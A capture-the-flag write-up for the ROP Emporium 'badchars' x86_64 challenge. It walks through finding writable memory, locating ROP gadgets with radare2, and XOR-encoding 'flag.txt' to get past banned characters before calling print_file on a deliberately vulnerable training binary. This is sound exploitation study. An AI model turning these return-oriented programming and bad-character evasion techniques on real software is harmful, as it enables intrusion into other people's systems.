# ROP Emporium - 05 badchars x86_64

## ELF Binary Info
> $ `rabin2 -I ./badchars`  
```
arch     x86
baddr    0x400000
binsz    6523
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Find readable and writeable area of memory
- 1st terminal, run ELF binary and keep it open
- 2nd terminal, search proc maps of running process for readable and writeable memory:
> $ `cat /proc/$(pgrep -f ./badchars)/maps | grep rw`
```  
00601000-00602000 rw-p 00001000 fe:01 656477                             /<badchars_filepath>
[...]
```
- Step through binary in GDB and search for free memory between `00601000-00602000` to place "flag.txt" string
- Ensure there are null bytes after chosen memory address so that null terminator does not need to be added manually
> $ `gdb -q ./badchars`  
> (gdb) `start`  
> (gdb) `disass pwnme`  
```
Dump of assembler code for function pwnme:
[...]
   0x00007f97526e5987 <+141>:	call   0x7f97526e57c0 <read@plt>
   0x00007f97526e598c <+146>:	mov    QWORD PTR [rbp-0x40],rax
   0x00007f97526e5990 <+150>:	mov    QWORD PTR [rbp-0x38],0x0
[...]
End of assembler dump.
```
- Set breakpoint after read() instruction
> (gdb) `b *pwnme+146`  
> (gdb) `c`  
```
Continuing.
badchars by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAAAAAA
```
> (gdb) `x/512gx 0x601000`  
```
[...]
0x6019f0:	0x0000000000000000	0x0000000000000000
0x601a00:	0x0000000000000000	0x0000000000000000
0x601a10:	0x0000000000000000	0x0000000000000000
[...]
```
- Memory address `0x601a00` looks like it matches criteria

## Get ROP Gadgets
> $ `r2 -A ./badchars`  
- Search for gadget that writes to memory
> [0x00400520]> `/R mov qword`  
```
[...]
  0x00400634           4d896500  mov qword [r13], r12
  0x00400638                 c3  ret
[...]
```
- Search for gadget that pops r12 and pops r13
> [0x00400520]> `/R pop r12`  
```
  0x0040069c               415c  pop r12
  0x0040069e               415d  pop r13
  0x004006a0               415e  pop r14
  0x004006a2               415f  pop r15
  0x004006a4                 c3  ret
[...]
```
- Search for gadget that pops rdi
> [0x00400520]> `/R pop rdi`  
```
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret
```
- Luckily there's a function that prints from file
> [0x00400520]> `pdf @ sym.usefulFunction`  
```
╭ 17: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      bfc4064000     mov edi, str.nonexistent    ; 0x4006c4 ; "nonexistent"
│           0x00400620      e8ebfeffff     call sym.imp.print_file
│           0x00400625      90             nop
│           0x00400626      5d             pop rbp
╰           0x00400627      c3             ret
```
- With above gadgets, string can be written to memory, popped into rdi and print_file function called (similar to previous level)
- However, this challenge prevents use of characters `'x', 'g', 'a', '.'`, so search for gadgets that can work around this restriction:
> [0x00400520]> `/R xor byte`  
```
[...]
  0x00400628             453037  xor byte [r15], r14b
  0x0040062b                 c3  ret
[...]
```
- Able to xor a value in memory one byte at a time, so first xor "flag.txt" with another value e.g. "^":
> `"flag.txt" ^ "^^^^^^^^" == "82?9p*&*"`  
- Therefore `"82?9p*&*"` will be initially inserted into memory at address `0x601a00`
- After xor'ing each char with `"^"`, result will be `"flag.txt"` again

## Get Flag
> $ `python get_flag.py`  
```
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
